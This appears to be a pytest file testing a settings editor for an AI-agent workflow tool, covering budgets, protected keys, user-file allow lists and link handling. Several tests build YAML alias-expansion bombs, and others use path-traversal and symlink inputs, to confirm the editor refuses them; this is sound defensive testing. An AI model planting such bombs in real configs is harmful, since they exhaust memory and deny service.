    assert fields[("agents", "claude", "bash_output_chars")]["max"] == 1000000
    text = shipped.read_text(encoding="utf-8")
    config_edit.save(shipped, form(shipped, (["agents", "claude", "max_turns_by_role"], {"review": 45, "plan": 60, "build": 70,
                                                                                         "debug": 60, "mechanical": 0}),
                                   (["agents", "claude", "session_budget_usd"], {"review": 4, "plan": 10, "build": 7.5, "debug": 10}),
                                   (["agents", "claude", "bash_output_chars"], 20000)))
    spec = load_config(shipped).agents["claude"]
    assert spec.max_turns_by_role["build"] == 70 and spec.max_turns_by_role["mechanical"] == 0
    assert spec.session_budget_usd["build"] == 7.5 and spec.bash_output_chars == 20000
    after = shipped.read_text(encoding="utf-8")
    assert sum(1 for line in after.splitlines() if "#" in line) >= sum(1 for line in text.splitlines() if "#" in line)
    with pytest.raises(EditError):  # what the page sent before it learned `number` maps: text, which the server refuses
        form(shipped, (["agents", "claude", "session_budget_usd"], {"build": "7.5"}))
    with pytest.raises(EditError):
        form(shipped, (["agents", "claude", "max_turns_by_role"], {"build": -1}))
    with pytest.raises(EditError):
        form(shipped, (["agents", "claude", "session_budget_usd"], {"build": -1}))
    with pytest.raises(EditError):
        form(shipped, (["agents", "claude", "bash_output_chars"], 2000001))
    for key, value in ((["agents", "claude", "session_budget_usd"], {"build": 10 ** 400}),
                       (["agents", "claude", "session_budget_usd"], {"build": True}),
                       (["agents", "claude", "bash_output_chars"], True)):
        try:  # refused, by the form's check or as a config that does not load: never a crash of the page's request
            refused = bool(form(shipped, (key, value)).errors)
        except EditError:
            refused = True
        assert refused, (key, value)
    with pytest.raises(Refused):  # a step's own turn cap is in the workflow, which the page does not edit
        form(shipped, (["phases", "build", "steps", "0", "max_turns"], 20))
    with pytest.raises(Refused):  # ... and so is its `carry`
        form(shipped, (["phases", "build", "steps", "0", "carry"], {"max_tasks": 4}))


def test_context_run_brief_and_gate_lines_editable(shipped):
    fields = {tuple(f["key"]): f for s in config_edit.form_fields(shipped)["sections"] for f in s["fields"]}
    assert fields[("context", "run_brief")]["kind"] == "bool"
    assert fields[("context", "resume_gate_lines")]["min"] == 10 and fields[("context", "resume_gate_lines")]["max"] == 1000
    text = shipped.read_text(encoding="utf-8")
    config_edit.save(shipped, form(shipped, (["context", "run_brief"], False), (["context", "resume_gate_lines"], 120)))
    cfg = load_config(shipped)
    assert cfg.context.run_brief is False and cfg.context.resume_gate_lines == 120
    after = shipped.read_text(encoding="utf-8")
    assert sum(1 for line in after.splitlines() if "#" in line) >= sum(1 for line in text.splitlines() if "#" in line)
    with pytest.raises(EditError):
        form(shipped, (["context", "resume_gate_lines"], 5))


def test_agent_rules_is_protected(shipped):
    with pytest.raises(Refused):  # the form has no field for it
        form(shipped, (["project", "agent_rules"], ["AGENTS.md"]))
    _, sha = config_edit.read(shipped)
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=SHIPPED.replace("project:\n", "project:\n  agent_rules: [AGENTS.md]\n", 1), repo=REPO)


def test_the_settings_form_has_the_park_keys(shipped):
    from agentflow import hitl

    fields = _fields(shipped)
    park = fields[("hitl", "park_independent")]
    assert (park["label"], park["kind"]) == ("Park a stopped task and go on", "bool")
    kinds = fields[("hitl", "park_kinds")]
    assert (kinds["label"], kinds["kind"]) == ("Stops that park a task", "list")
    proposal = form(shipped, (["hitl", "park_kinds"], ["blocked", "gate_failed"]), (["hitl", "park_independent"], False))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    saved = load_config(shipped).hitl
    assert saved["park_kinds"] == ["blocked", "gate_failed"] and saved["park_independent"] is False
    again = _fields(shipped)
    assert again[("hitl", "park_kinds")]["value"] == ["blocked", "gate_failed"]
    assert again[("hitl", "park_independent")]["value"] is False
    assert set(hitl.PARKABLE) >= {"blocked", "gate_failed"}


def test_the_settings_form_has_the_digest_key(shipped):
    field = _fields(shipped)[("hitl", "digest")]
    assert (field["label"], field["kind"]) == ("One digest line instead of a notification per stop", "bool")
    assert field["value"] is False
    proposal = form(shipped, (["hitl", "digest"], True))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    assert load_config(shipped).hitl["digest"] is True
    assert _fields(shipped)[("hitl", "digest")]["value"] is True


# --------------------------------------------------------------------------- the vuln block


def test_the_vuln_fields_round_trip(sparse_repo):
    path = _sparse(sparse_repo)
    with path.open("a", encoding="utf-8") as handle:  # `vuln.sync` needs a probe, and `vuln.probe` is protected
        handle.write("vuln:\n  probe: unit\n")
    fields = _fields(path)
    for key in ("min_severity", "sync", "dependency_files"):
        assert fields[("vuln", key)]["source"] == "engine"
    assert fields[("vuln", "min_severity")]["value"] == "low" and fields[("vuln", "sync")]["value"] is False
    proposal = _sparse_form(path, (["vuln", "min_severity"], "high"), (["vuln", "sync"], True),
                            (["vuln", "dependency_files"], ["**/go.mod", "**/go.sum"]))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    cfg = load_config(path)
    assert (cfg.vuln.min_severity, cfg.vuln.sync, cfg.vuln.dependency_files) == ("high", True, ("**/go.mod", "**/go.sum"))
    assert _fields(path)[("vuln", "min_severity")]["source"] == "project"
    again = _sparse_form(path, (["vuln", "min_severity"], "critical"))
    assert not again.errors, again.errors
    config_edit.save(path, again)
    assert load_config(path).vuln.min_severity == "critical"


def test_turning_vuln_sync_on_without_a_probe_is_refused(sparse_repo):
    proposal = _sparse_form(_sparse(sparse_repo), (["vuln", "sync"], True))
    assert [(i.path, i.message) for i in proposal.errors] == [
        ("vuln.sync", "is on, but the Backlog cannot start an alert without a vuln.probe gate")]


@pytest.mark.parametrize("key, value", [
    (["vuln", "min_severity"], "urgent"), (["vuln", "sync"], "yes"), (["vuln", "dependency_files"], "**/go.mod"),
    (["vuln", "dependency_files"], [""]),
])
def test_the_vuln_fields_refuse_bad_values(sparse_repo, key, value):
    path = _sparse(sparse_repo)
    try:
        proposal = _sparse_form(path, (key, value))
    except EditError:
        return
    assert proposal.errors


def test_vuln_source_probe_and_forbid_are_protected(shipped):
    for key in ("vuln.source", "vuln.probe", "vuln.forbid"):
        assert key in config_edit.PROTECTED and key in config_edit.form_fields(shipped)["protected"]
    _, sha = config_edit.read(shipped)
    for key, value in ((["vuln", "source"], ""), (["vuln", "probe"], "floor"), (["vuln", "forbid"], ["x"])):
        with pytest.raises(Refused):  # the form has no field for it
            form(shipped, (key, value))
    for added in ("vuln: {source: ''}\n", "vuln: {probe: floor}\n", "vuln: {forbid: [x]}\n"):
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED + added, repo=REPO)


# --------------------------------------------------------------------------- backlog.ignore_specs


def test_the_form_saves_backlog_ignore_specs_as_a_list(sparse_repo):
    path = _sparse(sparse_repo)
    assert _fields(path)[("backlog", "ignore_specs")]["value"] in ([], None)
    proposal = _sparse_form(path, (["backlog", "ignore_specs"], ["README.md", "*/index.md"]))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert load_config(path).backlog.ignore_specs == ("README.md", "*/index.md")
    assert _fields(path)[("backlog", "ignore_specs")]["source"] == "project"


@pytest.mark.parametrize("value", ["README.md", [""], ["a\nb"], [3]])
def test_the_form_refuses_backlog_ignore_specs_that_is_not_a_list_of_texts(sparse_repo, value):
    with pytest.raises(EditError):
        _sparse_form(_sparse(sparse_repo), (["backlog", "ignore_specs"], value))


def test_yaml_text_with_a_bad_backlog_ignore_specs_is_a_validate_error(sparse_repo):
    path = _sparse(sparse_repo)
    _, sha = config_edit.read(path)
    text = path.read_text(encoding="utf-8") + "backlog:\n  ignore_specs: ['../x']\n"
    proposal = config_edit.propose(path, sha, text=text, repo=path.parents[1])
    assert [(i.level, i.path) for i in proposal.errors] == [("error", "backlog.ignore_specs[0]")]


def test_the_settings_form_saves_the_claim_keys(sparse_repo):
    path = _sparse(sparse_repo)
    fields = _fields(path)
    assert fields[("backlog", "claims")]["kind"] == "bool"
    assert fields[("backlog", "claim_ref")]["kind"] == "enum"
    assert fields[("backlog", "claim_ref")]["options"] == ["refs", "branch"]
    assert fields[("backlog", "claim_stale_h")]["kind"] == "int"
    assert (fields[("backlog", "claim_stale_h")]["min"], fields[("backlog", "claim_stale_h")]["max"]) == (1, 720)
    assert (fields[("backlog", "claims")]["value"], fields[("backlog", "claim_ref")]["value"],
            fields[("backlog", "claim_stale_h")]["value"]) == (True, "refs", 24)
    proposal = _sparse_form(path, (["backlog", "claims"], False), (["backlog", "claim_ref"], "branch"),
                            (["backlog", "claim_stale_h"], 48))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    policy = load_config(path).backlog
    assert (policy.claims, policy.claim_ref, policy.claim_stale_h) == (False, "branch", 48)
    assert _fields(path)[("backlog", "claim_ref")]["source"] == "project"


@pytest.mark.parametrize("key, value", [("claim_ref", "tag"), ("claim_stale_h", 0), ("claim_stale_h", 721), ("claims", "yes")])
def test_the_settings_form_refuses_a_bad_claim_value(sparse_repo, key, value):
    with pytest.raises(EditError):
        _sparse_form(_sparse(sparse_repo), (["backlog", key], value))


def _mapping_bomb() -> str:
    """Nine anchored mappings, each holding nine references to the one before: 9**9 values once expanded. Mappings,
    because the Settings page's walks (`leaf_keys`, the line comments) follow mappings."""
    keys = [f"k{n}" for n in range(9)]
    lines = ["b0: &b0 {" + ", ".join(f"{k}: x" for k in keys) + "}"]
    lines += [f"b{i}: &b{i} {{" + ", ".join(f"{k}: *b{i - 1}" for k in keys) + "}" for i in range(1, 9)]
    return "\n".join(lines) + "\n"


def test_the_settings_page_refuses_a_pack_of_nested_aliases_quickly(shipped):
    import time

    shipped.write_text(SHIPPED + _mapping_bomb(), encoding="utf-8")
    started = time.monotonic()
    with pytest.raises(EditError, match="nested aliases"):
        config_edit.form_fields(shipped)
    with pytest.raises(EditError, match="nested aliases"):
        form(shipped, (["defaults", "step_timeout_min"], 60))
    assert time.monotonic() - started < 2


def test_a_yaml_tab_text_of_nested_aliases_is_refused_quickly(shipped):
    import time

    _, sha = config_edit.read(shipped)
    started = time.monotonic()
    proposal = config_edit.propose(shipped, sha, text=SHIPPED + _mapping_bomb(), repo=REPO)
    assert time.monotonic() - started < 2
    assert any("nested aliases" in issue.message for issue in proposal.errors)


def test_a_yaml_tab_edit_of_a_pack_whose_protected_key_holds_a_bomb_is_refused_quickly(shipped):
    """Both the file on disk and the new text hold the same 9**10-value bomb under a protected key: the check must
    refuse the text before it compares the two, value by value."""
    import time

    lines = ["a0: &a0 [x, x, x, x, x, x, x, x, x]"]
    lines += [f"a{i}: &a{i} [{', '.join([f'*a{i - 1}'] * 9)}]" for i in range(1, 10)]
    bomb = SHIPPED + "\n".join(lines) + "\nworkspace: *a9\n"
    shipped.write_text(bomb, encoding="utf-8")
    _, sha = config_edit.read(shipped)
    started = time.monotonic()
    proposal = config_edit.propose(shipped, sha, text=bomb.replace("step_timeout_min: 45", "step_timeout_min: 60"),
                                   repo=REPO)
    assert time.monotonic() - started < 2
    assert any("nested aliases" in issue.message for issue in proposal.errors)


def test_a_yaml_tab_text_over_the_byte_cap_is_refused(shipped):
    from agentflow import layers

    _, sha = config_edit.read(shipped)
    with pytest.raises(EditError, match=f"at most {layers.MAX_CONFIG_BYTES} bytes"):
        config_edit.propose(shipped, sha, text=SHIPPED + "#" * layers.MAX_CONFIG_BYTES, repo=REPO)


def test_the_settings_page_refuses_a_merge_key_chain_quickly(shipped):
    import time

    from test_layers import merge_chain

    chain = merge_chain(64 * 1024)
    _, sha = config_edit.read(shipped)
    started = time.monotonic()
    proposal = config_edit.propose(shipped, sha, text=SHIPPED + chain, repo=REPO)
    assert any("merge keys" in issue.message for issue in proposal.errors)
    shipped.write_text(SHIPPED + chain, encoding="utf-8")
    with pytest.raises(EditError, match="merge keys"):
        config_edit.form_fields(shipped)
    assert time.monotonic() - started < 3


# --------------------------------------------------------------------------- the user file: Your settings


def _user_fields(path: Path | None = None) -> dict:
    return {tuple(f["key"]): f for s in config_edit.user_form_fields(path)["sections"] for f in s["fields"]}


def _user_propose(*changes, packs=(), path: Path | None = None) -> config_edit.Proposal:
    from agentflow import layers

    _, sha, _ = config_edit.read_user(path or layers.user_config_path())
    return config_edit.propose_user(sha, [{"key": k, "value": v} for k, v in changes], packs, path)


def _user_save(*changes, packs=(), path: Path | None = None) -> str:
    proposal = _user_propose(*changes, packs=packs, path=path)
    assert not proposal.errors, proposal.errors
    return config_edit.save_user(proposal, path)


def test_the_user_form_holds_the_allow_list_and_nothing_else():
    from agentflow import layers

    fields = _user_fields()
    assert set(fields) == set(config_edit.USER_FIELD_KEYS)
    for key, item in fields.items():
        assert any(len(p.split(".")) == len(key) and all(s in ("*", k) for s, k in zip(p.split("."), key))
                   for p in layers.USER_KEYS), key
        assert ".".join(key) not in ("hitl.notify", "agents.claude.user_settings", "dashboard.host")
        protected = [p for p in config_edit._PROTECTED_KEYS if key[:len(p.split("."))] == tuple(p.split("."))]
        assert protected in ([], ["workspace"]), (key, protected)
        assert item["target"] == "user" and item["optional"] is True
        if key[0] == "workspace" and key[1] in layers.WORKSPACE_LISTS:
            assert item["lines"] is True
    assert {key for key in fields if key[0] == "agents"} == {("agents", "claude", "models"), ("agents", "codex", "models")}


def test_the_cap_and_the_digest_save_to_the_user_file():
    from agentflow import layers

    fields = _user_fields()
    assert fields[("workspace", "max_active_runs")]["kind"] == "int"
    assert (fields[("workspace", "max_active_runs")]["min"], fields[("workspace", "max_active_runs")]["max"]) == (1, 64)
    assert fields[("workspace", "digest")]["kind"] == "bool"
    _user_save((["workspace", "max_active_runs"], 3), (["workspace", "digest"], True))
    path = layers.user_config_path()
    assert yaml.safe_load(path.read_text(encoding="utf-8")) == {"workspace": {"max_active_runs": 3, "digest": True}}
    for bad in (0, 65, True, "3"):
        with pytest.raises(config_edit.EditError):
            _user_propose((["workspace", "max_active_runs"], bad))
    _user_save((["workspace", "max_active_runs"], None))
    assert yaml.safe_load(path.read_text(encoding="utf-8")) == {"workspace": {"digest": True}}


def test_a_missing_user_file_is_an_empty_form_and_the_first_save_creates_it_private(tmp_path):
    import hashlib
    import stat

    from agentflow import layers

    p = layers.user_config_path()
    assert not p.parent.exists()
    assert config_edit.read_user(p) == ("", hashlib.sha256(b"").hexdigest(), False)
    data = config_edit.user_form_fields()
    assert data["exists"] is False and data["editable"] is True and data["error"] is None
    root = tmp_path / "code"
    root.mkdir()
    _user_save((["workspace", "roots"], [str(root)]))
    assert p.is_file() and stat.S_IMODE(p.stat().st_mode) == 0o600
    assert yaml.safe_load(p.read_text(encoding="utf-8")) == {"workspace": {"roots": [str(root)]}}
    assert config_edit.user_form_fields()["exists"] is True
    assert _user_fields()[("workspace", "roots")]["source"] == "user"


def test_a_commented_out_workspace_block_takes_a_new_root(tmp_path):
    from agentflow import layers

    root = tmp_path / "code"
    root.mkdir()
    p = layers.user_config_path()
    p.parent.mkdir(parents=True)
    p.write_text("hitl:\n  notify: [desktop]  # mine\nworkspace:\n  # roots:\n  #   - ~/old\n", encoding="utf-8")
    _user_save((["workspace", "roots"], [str(root)]))
    text = p.read_text(encoding="utf-8")
    assert yaml.safe_load(text) == {"hitl": {"notify": ["desktop"]}, "workspace": {"roots": [str(root)]}}
    assert "# mine" in text and "# roots:" in text
    p.write_text("", encoding="utf-8")
    _user_save((["workspace", "roots"], [str(root)]))
    assert yaml.safe_load(p.read_text(encoding="utf-8")) == {"workspace": {"roots": [str(root)]}}


@pytest.mark.parametrize("key", [["hitl", "notify"], ["agents", "claude", "user_settings"], ["dashboard", "host"],
                                 ["gates", "unit"], ["workspace"], ["agents", "mine", "models"]])
def test_keys_outside_the_allow_list_are_refused_and_change_nothing(key):
    p = _user_file({"dashboard": {"done_shown": 20}})
    before = p.read_bytes()
    with pytest.raises(Refused):
        _user_propose((key, ["x"] if key[-1] == "notify" else True))
    assert p.read_bytes() == before


def test_a_new_root_must_be_an_existing_folder_and_an_old_one_may_be_gone(tmp_path):
    existing = tmp_path / "code"
    existing.mkdir()
    p = _user_file({"workspace": {"roots": ["/gone"]}})
    _user_save((["dashboard", "done_shown"], 20))
    _user_save((["workspace", "roots"], ["/gone", str(existing)]))
    assert yaml.safe_load(p.read_text(encoding="utf-8"))["workspace"]["roots"] == ["/gone", str(existing)]
    before = p.read_bytes()
    with pytest.raises(EditError, match="not a folder"):
        _user_propose((["workspace", "roots"], ["/gone", "/nope"]))
    for bad in ("code", "~bob/x"):
        with pytest.raises(EditError, match="absolute path"):
            _user_propose((["workspace", "roots"], [bad]))
    assert p.read_bytes() == before


def test_a_stale_base_is_a_conflict_for_the_user_file():
    p = _user_file({"dashboard": {"done_shown": 20}})
    with pytest.raises(Conflict):
        config_edit.propose_user("0" * 64, [{"key": ["dashboard", "done_shown"], "value": 30}])
    proposal = _user_propose((["dashboard", "done_shown"], 30))
    p.write_text(p.read_text(encoding="utf-8") + "# edited by hand\n", encoding="utf-8")
    with pytest.raises(Conflict):
        config_edit.save_user(proposal)
    assert yaml.safe_load(p.read_text(encoding="utf-8")) == {"dashboard": {"done_shown": 20}}


def test_a_symlinked_or_hardlinked_user_file_is_shown_read_only_and_never_written(tmp_path):
    from agentflow import layers

    p = layers.user_config_path()
    p.parent.mkdir(parents=True)
    real = tmp_path / "real.yaml"
    real.write_text("dashboard: {done_shown: 20}\n", encoding="utf-8")
    p.symlink_to(real)
    data = config_edit.user_form_fields()
    assert data["editable"] is False and "symlink" in data["error"]
    with pytest.raises(EditError, match="symlink"):
        config_edit.propose_user(config_edit.sha256(real.read_text(encoding="utf-8")),
                                 [{"key": ["dashboard", "done_shown"], "value": 30}])
    p.unlink()
    os.link(real, p)
    data = config_edit.user_form_fields()
    assert data["editable"] is False and "hardlink" in data["error"]
    with pytest.raises(EditError, match="hardlink"):
        config_edit.propose_user(config_edit.sha256(real.read_text(encoding="utf-8")),
                                 [{"key": ["dashboard", "done_shown"], "value": 30}])
    assert real.read_text(encoding="utf-8") == "dashboard: {done_shown: 20}\n"
    # a folder at the file's path: not a regular file, shown read only, and no descriptor is left open
    p.unlink()
    p.mkdir()
    fds = len(os.listdir("/dev/fd"))
    data = config_edit.user_form_fields()
    assert data["editable"] is False and "not a regular file" in data["error"]
    with pytest.raises(EditError, match="not a regular file"):
        config_edit.read_user(p)
    assert len(os.listdir("/dev/fd")) == fds
    p.rmdir()
    # a symlinked `agentflow` folder: the save refuses it and the link's target is untouched
    p.parent.rmdir()
    target = tmp_path / "elsewhere"
    target.mkdir()
    p.parent.symlink_to(target, target_is_directory=True)
    proposal = config_edit.Proposal(config_edit.sha256(""), "dashboard: {done_shown: 30}\n", "diff")
    with pytest.raises(EditError):
        config_edit.save_user(proposal)
    assert list(target.iterdir()) == []
    assert config_edit.user_form_fields()["editable"] is False


def test_an_unparseable_user_file_is_read_only_and_a_loadable_fix_is_accepted(tmp_path):
    from agentflow import layers

    p = layers.user_config_path()
    p.parent.mkdir(parents=True)
    p.write_text("::: [\n", encoding="utf-8")
    data = config_edit.user_form_fields()
    assert data["editable"] is False and data["error"]
    existing = tmp_path / "code"
    existing.mkdir()
    p.write_text("workspace: {roots: [code]}\n", encoding="utf-8")
    data = config_edit.user_form_fields()
    assert data["editable"] is True and "workspace.roots" in data["error"]
    _user_save((["workspace", "roots"], [str(existing)]))
    assert layers.load_user_settings().workspace.roots == (str(existing),)
    assert config_edit.user_form_fields()["error"] is None


def test_a_user_edit_that_breaks_a_live_pack_is_an_error_naming_it(tmp_path):
    from conftest import SPARSE_PACK

    a = tmp_path / "a" / ".agentflow" / "config.yaml"
    a.parent.mkdir(parents=True)
    a.write_text(yaml.safe_dump({**SPARSE_PACK, "agents": {**SPARSE_PACK["agents"], "codex": None}}), encoding="utf-8")
    assert "codex" not in load_config(a).agents  # pack A loads on its own, with no codex agent
    b = tmp_path / "b" / ".agentflow" / "config.yaml"
    b.parent.mkdir(parents=True)
    b.write_text(yaml.safe_dump({**SPARSE_PACK, "version": 99}), encoding="utf-8")
    with pytest.raises(ConfigError):
        load_config(b)  # pack B is already broken: it blocks nothing
    p = _user_file({"dashboard": {"done_shown": 20}})
    before = p.read_bytes()
    proposal = _user_propose((["agents", "codex", "models"], {"build": "x"}), packs=[("A", a), ("B", b)])
    assert len(proposal.errors) == 1, proposal.errors
    said = f"{proposal.errors[0].path}: {proposal.errors[0].message}"
    assert "A:" in said and ".config-check-" not in said and str(p) in said
    with pytest.raises(EditError):
        config_edit.save_user(proposal)
    assert p.read_bytes() == before
    assert not [f for f in p.parent.iterdir() if f.name.startswith(".config-")]
    assert not _user_propose((["agents", "claude", "models"], {"build": "opus"}), packs=[("A", a), ("B", b)]).errors


def _refused_naming(proposal: config_edit.Proposal, name: str, key: str) -> str:
    """The one error a user edit gets in the live pack `name`, at `key`; it never names the temporary file."""
    assert len(proposal.errors) == 1, proposal.errors
    issue = proposal.errors[0]
    said = f"{issue.path}: {issue.message}"
    assert issue.path == key and issue.message.startswith(f"{name}: ") and ".config-check-" not in said, said
    return said


def test_a_user_soft_budget_over_the_hard_limit_fails_validate_and_is_refused_naming_the_repository(sparse_repo):
    from agentflow.config import validate

    pack_path = sparse_repo / ".agentflow" / "config.yaml"
    p = _user_file({"dashboard": {"done_shown": 20}})
    before = p.read_bytes()
    assert not [i for i in validate(load_config(pack_path), sparse_repo) if i.level == "error"]
    packs = [("billing", pack_path, sparse_repo)]
    proposal = _user_propose((["defaults", "run_budget_usd"], 100), packs=packs)
    assert "below run_budget_usd" in _refused_naming(proposal, "billing", "defaults.run_budget_hard_usd")
    with pytest.raises(EditError):
        config_edit.save_user(proposal)
    assert p.read_bytes() == before
    assert not [f for f in p.parent.iterdir() if f.name.startswith(".config-")]
    assert not _user_propose((["defaults", "run_budget_usd"], 100), (["defaults", "run_budget_hard_usd"], 150),
                             packs=packs).errors


def test_a_user_five_hour_soft_over_the_hard_mark_fails_validate_and_is_refused_naming_the_repository(sparse_repo):
    pack_path = sparse_repo / ".agentflow" / "config.yaml"
    p = _user_file({"dashboard": {"done_shown": 20}})
    before = p.read_bytes()
    packs = [("billing", pack_path, sparse_repo)]
    proposal = _user_propose((["usage", "five_hour_soft"], 0.95), packs=packs)
    assert "below five_hour_hard" in _refused_naming(proposal, "billing", "usage.five_hour_soft")
    with pytest.raises(EditError):
        config_edit.save_user(proposal)
    assert p.read_bytes() == before
    assert not _user_propose((["usage", "five_hour_soft"], 0.95), (["usage", "five_hour_hard"], 0.98),
                             packs=packs).errors


def test_a_validate_error_a_live_pack_already_has_blocks_nothing_but_a_new_one_still_does(sparse_repo):
    from conftest import SPARSE_PACK

    pack_path = sparse_repo / ".agentflow" / "config.yaml"
    pack_path.write_text(yaml.safe_dump({**SPARSE_PACK, "defaults": {"run_budget_hard_usd": 10}}),
                         encoding="utf-8")  # below the engine's soft budget: validate fails here today
    _user_file({"dashboard": {"done_shown": 20}})
    packs = [("billing", pack_path, sparse_repo)]
    assert not _user_propose((["defaults", "run_budget_usd"], 30), packs=packs).errors  # the same error, reworded
    _refused_naming(_user_propose((["usage", "five_hour_soft"], 0.95), packs=packs), "billing", "usage.five_hour_soft")


def test_the_pack_form_says_each_field_saves_to_the_pack(sparse_repo):
    path = _sparse(sparse_repo)
    assert all(f["target"] == "project" for f in _fields(path).values())
    _user_file({"dashboard": {"done_shown": 20}})
    shown = _fields(path)[("dashboard", "done_shown")]
    assert "user config" in shown["readonly"] and "Your settings" in shown["hint"]
    assert "hint" not in _fields(path)[("dashboard", "port")]


def test_clearing_a_user_field_removes_the_key_and_the_engine_decides_again():
    p = _user_file({"agents": {"claude": {"models": {"build": "opus"}}}, "dashboard": {"done_shown": 20}})
    assert _user_fields()[("agents", "claude", "models")]["value"]["build"] == "opus"
    _user_save((["agents", "claude", "models"], None), (["dashboard", "done_shown"], None))
    assert (yaml.safe_load(p.read_text(encoding="utf-8")) or {}) == {}  # no empty block is left behind
    models = _user_fields()[("agents", "claude", "models")]
    assert models["source"] == "engine" and models["value"]["build"] == "sonnet"
    big = {f"role{i}": "m" * 400 for i in range(400)}  # a text past the byte cap would never be read again
    with pytest.raises(EditError, match="bytes"):
        _user_propose((["agents", "codex", "models"], big))
